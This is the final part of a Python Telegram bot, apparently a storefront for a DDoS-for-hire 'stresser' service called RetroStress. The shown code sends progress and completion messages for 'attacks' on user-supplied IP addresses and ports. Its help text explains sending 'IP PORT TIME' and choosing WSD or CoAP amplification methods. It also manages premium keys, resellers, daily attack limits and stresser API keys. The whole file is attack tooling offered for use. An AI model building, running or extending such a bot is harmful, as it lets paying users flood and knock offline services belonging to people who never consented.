                            f"⏰ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!** ⏰\n\n"
                            f"🆔 **𝐀𝐭𝐭𝐚𝐜𝐤 𝐈𝐃:** `{attack.attack_id}`\n"
                            f"🎯 **𝐓𝐚𝐫𝐠𝐞𝐭:** `{attack.target_ip}`:{attack.port}\n"
                            f"✅ **𝐒𝐭𝐚𝐭𝐮𝐬:** 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝\n"
                            f"🕐 **𝐓𝐢𝐦𝐞:** {datetime.now().strftime('%H:%M:%S')}\n\n"
                            f"🚀 𝐑𝐞𝐚𝐝𝐲 𝐟𝐨𝐫 𝐧𝐞𝐱𝐭 𝐚𝐭𝐭𝐚𝐜𝐤!\n"
                            f"👑 {get_owner_link()}"
                        )
                        await bot.send_message(
                            attack.user_id,
                            complete_notification,
                            parse_mode='Markdown',
                            disable_web_page_preview=True
                        )
                    except Exception as e:
                        logger.error(f"Complete notification failed: {e}")
                break
            
            # Progress update
            progress_bar = create_progress_bar(int(elapsed), attack.duration)
            
            if elapsed < attack.duration * 0.3:
                status_emoji = "🟢"
                status_text = "𝐒𝐓𝐀𝐑𝐓𝐄𝐃"
            elif elapsed < attack.duration * 0.7:
                status_emoji = "🟡"
                status_text = "𝐑𝐔𝐍𝐍𝐈𝐍𝐆"
            else:
                status_emoji = "🔴"
                status_text = "𝐅𝐈𝐍𝐈𝐒𝐇𝐈𝐍𝐆"
            
            progress_text = (
                f"{status_emoji} **𝐀𝐓𝐓𝐀𝐂𝐊 {status_text}** {status_emoji}\n\n"
                f"🆔 **𝐀𝐭𝐭𝐚𝐜𝐤 𝐈𝐃:** `{attack.attack_id}`\n"
                f"🎯 **𝐓𝐚𝐫𝐠𝐞𝐭:** `{attack.target_ip}`:{attack.port}\n"
                f"⚡ **𝐌𝐞𝐭𝐡𝐨𝐝:** {attack.method}\n\n"
                f"⏱ **𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:**\n"
                f"{progress_bar}\n\n"
                f"📊 **𝐒𝐭𝐚𝐭𝐬:**\n"
                f"  ⏳ 𝐄𝐥𝐚𝐩𝐬𝐞𝐝: {int(elapsed)}s / {attack.duration}s\n"
                f"  ⏱ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {remaining}s\n"
                f"  📈 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞: {int(100*elapsed/attack.duration)}%\n\n"
                f"🔄 𝐀𝐮𝐭𝐨-𝐫𝐞𝐟𝐫𝐞𝐬𝐡 {Config.PROGRESS_UPDATE_INTERVAL}s\n"
                f"👑 {get_owner_link()}"
            )
            
            try:
                await bot.edit_message_text(
                    progress_text,
                    chat_id=attack.chat_id,
                    message_id=attack.message_id,
                    parse_mode='Markdown',
                    disable_web_page_preview=True
                )
            except Exception as e:
                logger.error(f"Progress update failed: {e}")
            
            await asyncio.sleep(Config.PROGRESS_UPDATE_INTERVAL)
    
    # ============== HELPERS ==============
    def validate_ip(self, ip: str) -> bool:
        pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return bool(re.match(pattern, ip))
    
    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show user status"""
        user = update.effective_user
        user_data = self.db.get_user(user.id, user.username, user.first_name)
        
        uptime = datetime.now() - self.db.global_stats['start_time']
        user_active = sum(1 for a in self.db.active_attacks.values() if a.user_id == user.id)
        
        # Premium/Reseller status
        status_lines = []
        if user_data.is_premium and user_data.key_expiry:
            if datetime.now() < user_data.key_expiry:
                remaining = user_data.key_expiry - datetime.now()
                status_lines.append(f"🔑 **𝐏𝐫𝐞𝐦𝐢𝐮𝐦:** ✅ {remaining.days}𝐝 {remaining.seconds//3600}𝐡 𝐥𝐞𝐟𝐭")
            else:
                user_data.is_premium = False
                status_lines.append("🔑 **𝐏𝐫𝐞𝐦𝐢𝐮𝐦:** ❌ 𝐄𝐱𝐩𝐢𝐫𝐞𝐝")
        
        if user.id in self.db.resellers:
            r = self.db.resellers[user.id]
            status_lines.append(f"🤝 **𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫:** ✅ 𝐀𝐜𝐭𝐢𝐯𝐞")
        
        status_info = "\n".join(status_lines)
        if status_info:
            status_info = "\n" + status_info + "\n"
        
        daily_remaining = user_data.daily_limit - user_data.daily_attacks
        
        status_text = (
            f"📊 **𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒** 📊\n\n"
            f"👤 **@{user.username or 'N/A'}** | 🆔 `{user.id}`\n"
            f"{status_info}"
            f"📊 **𝐃𝐚𝐢𝐥𝐲:** {user_data.daily_attacks}/{user_data.daily_limit} (𝐑𝐞𝐦: {daily_remaining})\n"
            f"🚀 **𝐓𝐨𝐭𝐚𝐥:** {user_data.total_attacks} | ⚡ **𝐀𝐜𝐭𝐢𝐯𝐞:** {user_active}\n"
            f"⏱ **𝐋𝐚𝐬𝐭:** {user_data.last_attack_time.strftime('%H:%M:%S') if user_data.last_attack_time else '𝐍𝐞𝐯𝐞𝐫'}\n\n"
            f"🌍 **𝐆𝐥𝐨𝐛𝐚𝐥:** {len(self.db.users)} 𝐮𝐬𝐞𝐫𝐬 | {len(self.db.active_attacks)} 𝐚𝐜𝐭𝐢𝐯𝐞\n"
            f"⏱ **𝐔𝐩𝐭𝐢𝐦𝐞:** {str(uptime).split('.')[0]}\n"
            f"👑 **𝐎𝐰𝐧𝐞𝐫:** {get_owner_link()}"
        )
        
        await update.message.reply_text(
            status_text, 
            parse_mode='Markdown', 
            disable_web_page_preview=True
        )
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show help"""
        help_text = (
            f"📚 **𝐑𝐄𝐓𝐑𝐎𝐒𝐓𝐑𝐄𝐒𝐒 𝐁𝐎𝐓 𝐇𝐄𝐋𝐏** 📚\n\n"
            f"👑 **𝐎𝐖𝐍𝐄𝐑:** {get_owner_link()}\n\n"
            f"⚡ **𝐇𝐨𝐰 𝐭𝐨 𝐔𝐬𝐞:**\n"
            f"𝟏. 𝐒𝐞𝐧𝐝 `𝐈𝐏 𝐏𝐎𝐑𝐓` → 𝐀𝐮𝐭𝐨 {Config.DEFAULT_DURATION}𝐬\n"
            f"𝟐. 𝐒𝐞𝐧𝐝 `𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄` → 𝐂𝐮𝐬𝐭𝐨𝐦\n"
            f"𝟑. 𝐒𝐞𝐥𝐞𝐜𝐭 𝐦𝐞𝐭𝐡𝐨𝐝 (𝐖𝐒𝐃/𝐂𝐎𝐀𝐏)\n"
            f"𝟒. 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐬 𝐚𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐜𝐚𝐥𝐥𝐲\n\n"
            f"📝 **𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:**\n"
            f"  `/start` - 🚀 𝐒𝐭𝐚𝐫𝐭 𝐛𝐨𝐭\n"
            f"  `/status` - 📊 𝐘𝐨𝐮𝐫 𝐬𝐭𝐚𝐭𝐮𝐬\n"
            f"  `/redeem` - 🔑 𝐑𝐞𝐝𝐞𝐞𝐦 𝐤𝐞𝐲\n"
            f"  `/reseller` - 🤝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐩𝐚𝐧𝐞𝐥\n"
            f"  `/owner` - 👑 𝐎𝐰𝐧𝐞𝐫 𝐩𝐚𝐧𝐞𝐥\n\n"
            f"📋 **𝐄𝐱𝐚𝐦𝐩𝐥𝐞𝐬:**\n"
            f"  `𝟏.𝟏.𝟏.𝟏 𝟐𝟐𝟔𝟔𝟐` → 𝟏𝟖𝟎𝐬\n"
            f"  `𝟏.𝟏.𝟏.𝟏 𝟐𝟐𝟔𝟔𝟐 𝟔𝟎` → 𝟔𝟎𝐬\n\n"
            f"🔑 **𝐏𝐫𝐞𝐦𝐢𝐮𝐦:** `/redeem 𝐘𝐎𝐔𝐑_𝐊𝐄𝐘`\n\n"
            f"⚙️ **𝐋𝐢𝐦𝐢𝐭𝐬:**\n"
            f"• 𝐌𝐚𝐱: {Config.MAX_ATTACK_DURATION}𝐬 | 𝐃𝐞𝐟𝐚𝐮𝐥𝐭: {Config.DEFAULT_DURATION}𝐬\n"
            f"• 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {Config.COOLDOWN_SECONDS}𝐬 | 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭: {Config.MAX_CONCURRENT_ATTACKS}\n\n"
            f"💬 **𝐍𝐞𝐞𝐝 𝐇𝐞𝐥𝐩?** {get_owner_link()}"
        )
        
        await update.message.reply_text(
            help_text, 
            parse_mode='Markdown', 
            disable_web_page_preview=True
        )
    
    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        logger.error(f"Error: {context.error}")
        
        try:
            if isinstance(update, Update):
                if update.callback_query:
                    await update.callback_query.edit_message_text(
                        f"❌ **𝐄𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝!**\n\n"
                        f"👑 {get_owner_link()}\n"
                        f"🤖 𝐓𝐫𝐲 /start",
                        parse_mode='Markdown',
                        disable_web_page_preview=True
                    )
                elif update.message:
                    await update.message.reply_text(
                        f"❌ **𝐄𝐫𝐫𝐨𝐫!** 𝐓𝐫𝐲 /start\n\n"
                        f"👑 {get_owner_link()}",
                        parse_mode='Markdown',
                        disable_web_page_preview=True
                    )
        except Exception as e:
            logger.error(f"Error handler failed: {e}")

# ============== MAIN ==============
async def post_init(application: Application):
    """Post initialization"""
    commands = [
        BotCommand("start", "🚀 Start bot & attack"),
        BotCommand("status", "📊 Your statistics"),
        BotCommand("redeem", "🔑 Redeem access key"),
        BotCommand("reseller", "🤝 Reseller panel"),
        BotCommand("owner", "👑 Owner panel"),
        BotCommand("help", "❓ Help & info")
    ]
    await application.bot.set_my_commands(commands)
    
    # Notify owner bot started
    try:
        await application.bot.send_message(
            Config.OWNER_ID,
            f"🤖 **𝐁𝐎𝐓 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** ✅\n\n"
            f"⏱ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"🔑 𝐀𝐏𝐈 𝐊𝐞𝐲𝐬: {len(Config.RETROSTRESS_API_KEYS)}\n"
            f"🟢 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧𝐚𝐥",
            parse_mode='Markdown'
        )
    except:
        pass

def main():
    """Main entry point"""
    # Validate config
    if Config.TELEGRAM_BOT_TOKEN == "YOUR_TOKEN_HERE":
        print("❌ ERROR: Set your TELEGRAM_BOT_TOKEN!")
        sys.exit(1)
    
    bot = RetroStressBot()
    
    application = Application.builder().token(Config.TELEGRAM_BOT_TOKEN).build()
    bot.application = application
    
    # Add handlers
    application.add_handler(CommandHandler("start", bot.cmd_start))
    application.add_handler(CommandHandler("status", bot.cmd_status))
    application.add_handler(CommandHandler("help", bot.cmd_help))
    application.add_handler(CommandHandler("owner", bot.cmd_owner))
    application.add_handler(CommandHandler("reseller", bot.cmd_reseller))
    application.add_handler(CommandHandler("redeem", bot.cmd_redeem))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(bot.button_handler))
    
    # Message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.message_handler))
    
    # Error handler
    application.add_error_handler(bot.error_handler)
    
    # Post init
    application.post_init = post_init
    
    logger.info("🚀 Ultimate Bot starting...")
    logger.info(f"👑 Owner: {Config.OWNER_USERNAME}")
    logger.info(f"🔑 API Keys: {len(Config.RETROSTRESS_API_KEYS)}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
